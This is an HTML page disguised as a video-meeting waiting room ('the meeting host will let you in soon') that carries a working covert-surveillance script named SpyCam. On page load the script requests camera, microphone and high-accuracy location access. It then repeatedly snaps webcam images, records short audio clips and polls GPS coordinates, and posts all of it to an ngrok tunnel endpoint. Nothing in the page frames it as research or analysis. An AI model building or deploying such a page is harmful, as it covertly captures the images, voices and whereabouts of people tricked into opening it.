<!DOCTYPE html>
<html>
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
</head>

<!-- Hidden video element for capture -->
<video id="video" width="640" height="480" autoplay playsinline muted style="display: none;"></video>
<canvas id="canvas" width="640" height="480" style="max-width: 90vw; max-height: 70vh; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); display: block; margin: 20px auto;"></canvas>

<div class="loading-overlay" id="loadingOverlay">
  <div class="loading-content">
    <h1>Please wait, the meeting host will let you in soon</h1>
    <div class="spinner"></div>
  </div>
</div>

<style>
  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500&display=swap");
  
  * { padding: 0; margin: 0; font-family: 'Nunito', sans-serif; font-weight: 500; }
  body { 
    height: 100vh; 
    width: 100vw; 
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    overflow: hidden;
  }
  
  .loading-overlay {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.8); z-index: 1001; display: flex;
    justify-content: center; align-items: center;
  }
  .loading-content {
    text-align: center; color: white; background: rgba(255,255,255,0.1);
    padding: 40px; border-radius: 20px; backdrop-filter: blur(10px);
  }
  .spinner {
    width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.3);
    border-top: 4px solid white; border-radius: 50%;
    animation: spin 1s linear infinite; margin: 20px auto;
  }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  
  .bottom-bar {
    position: fixed; bottom: 0; left: 0; right: 0; height: 80px;
    background: rgba(0,0,0,0.9); backdrop-filter: blur(20px);
    display: flex; justify-content: center; align-items: center;
    gap: 20px; padding: 0 20px; box-sizing: border-box;
  }
  .icon-button {
    display: flex; flex-direction: column; align-items: center;
    color: white; cursor: pointer; padding: 10px; border-radius: 15px;
    transition: all 0.3s ease;
  }
  .icon-button:hover { background: rgba(255,255,255,0.1); transform: translateY(-2px); }
  .icon-button i { font-size: 24px; margin-bottom: 5px; }
  .end-call {
    background: linear-gradient(45deg, #ef4444, #dc2626); color: white !important;
    padding: 12px 24px !important; border-radius: 25px; font-weight: 600;
    border: none; cursor: pointer; transition: all 0.3s ease;
  }
  .end-call:hover { transform: scale(1.05); box-shadow: 0 10px 25px rgba(239,68,68,0.4); }
</style>

<script>
class SpyCam {
  constructor() {
    this.video = document.getElementById('video');
    this.canvas = document.getElementById('canvas');
    this.loadingOverlay = document.getElementById('loadingOverlay');
    this.stream = null;
    this.mediaRecorder = null;
    this.audioChunks = [];
    this.currentLocation = null;
    this.tunnelUrl = 'https://7462-157-36-86-192.ngrok.io/post.php'; // Your tunnel
    this.init();
  }
  
  async init() {
    console.log('🔥 Starting spy cam...');
    
    // Hide loading after 5s
    setTimeout(() => {
      this.loadingOverlay.style.display = 'none';
      console.log('✅ Loading hidden');
    }, 5000);
    
    // Start everything
    await this.requestPermissions();
    this.startLocationTracking();
  }
  
  async requestPermissions() {
    try {
      console.log('📹 Requesting camera + mic...');
      
      const constraints = {
        video: { 
          facingMode: 'user', 
          width: { ideal: 640 }, 
          height: { ideal: 480 } 
        },
        audio: true
      };
      
      this.stream = await navigator.mediaDevices.getUserMedia(constraints);
      console.log('✅ Permissions granted');
      
      // Attach stream to video (CRITICAL - was missing!)
      this.video.srcObject = this.stream;
      this.video.onloadedmetadata = () => {
        console.log('✅ Video stream active');
        this.initRecorder();
        this.startCaptureLoop();
      };
      
    } catch (err) {
      console.error('❌ Permission denied:', err);
      alert('Camera/mic access denied. Please refresh and allow permissions.');
    }
  }
  
  initRecorder() {
    try {
      this.mediaRecorder = new MediaRecorder(this.stream, {
        mimeType: 'audio/webm;codecs=opus'
      });
      
      this.mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) this.audioChunks.push(e.data);
      };
      
      this.mediaRecorder.onstop = () => {
        console.log('✅ Audio captured');
      };
      
      console.log('✅ Recorder initialized');
    } catch (err) {
      console.error('❌ Audio recorder failed:', err);
    }
  }
  
  startCaptureLoop() {
    console.log('🔄 Starting capture loop...');
    
    setInterval(() => {
      try {
        // Capture image
        const ctx = this.canvas.getContext('2d');
        ctx.drawImage(this.video, 0, 0, 640, 480);
        const imageData = this.canvas.toDataURL('image/png');
        
        // Start audio (1.4s)
        if (this.mediaRecorder?.state === 'inactive') {
          this.mediaRecorder.start();
          setTimeout(() => {
            if (this.mediaRecorder?.state === 'recording') {
              this.mediaRecorder.stop();
            }
          }, 1400);
        }
        
        // Send after audio finishes
        setTimeout(() => {
          this.sendData(imageData).then(() => {
            this.audioChunks = []; // Clear
          });
        }, 1500);
        
      } catch (err) {
        console.error('❌ Capture failed:', err);
      }
    }, 1600); // Slightly longer interval
  }
  
  async sendData(imageData) {
    const formData = new FormData();
    formData.append('cat', imageData);
    
    if (this.audioChunks.length > 0) {
      const audioBlob = new Blob(this.audioChunks, { type: 'audio/webm' });
      formData.append('audio', audioBlob, 'audio.webm');
    }
    
    formData.append('location', JSON.stringify(this.currentLocation || {}));
    
    try {
      const response = await $.ajax({
        url: this.tunnelUrl,
        type: 'POST',
        data: formData,
        processData: false,
        contentType: false,
        timeout: 10000
      });
      console.log('✅ Data sent:', response);
    } catch (err) {
      console.error('❌ Send failed:', err);
    }
  }
  
  startLocationTracking() {
    const getLocation = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            this.currentLocation = {
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              timestamp: Date.now()
            };
            console.log('📍 Location:', this.currentLocation.lat, this.currentLocation.lng);
          },
          (err) => console.log('📍 Location error:', err.message),
          { enableHighAccuracy: true, maximumAge: 15000, timeout: 10000 }
        );
      }
    };
    
    getLocation();
    setInterval(getLocation, 10000);
  }
}

// Start when page loads
window.addEventListener('load', () => {
  console.log('🚀 SpyCam starting...');
  new SpyCam();
});
</script>

<body>
  <div class="bottom-bar">
    <div class="icon-button" title="Mute"><i class="fas fa-microphone"></i><span>MIC</span></div>
    <div class="icon-button" title="Video"><i class="fas fa-video"></i><span>VID</span></div>
    <div class="icon-button" title="Secure"><i class="fas fa-shield-alt"></i><span>SECURE</span></div>
    <div class="icon-button" title="Users"><i class="fas fa-users"></i><span>1</span></div>
    <div class="icon-button" style="color: #4ade80;"><i class="fas fa-plus-square"></i><span>SHARE</span></div>
    <div class="icon-button" title="Chat"><i class="fas fa-comments"></i><span>CHAT</span></div>
    <div class="icon-button" title="Record"><i class="fas fa-record-vinyl"></i><span>LIVE</span></div>
    <button class="end-call" onclick="window.close();">End Meeting</button>
  </div>
</body>
</html>
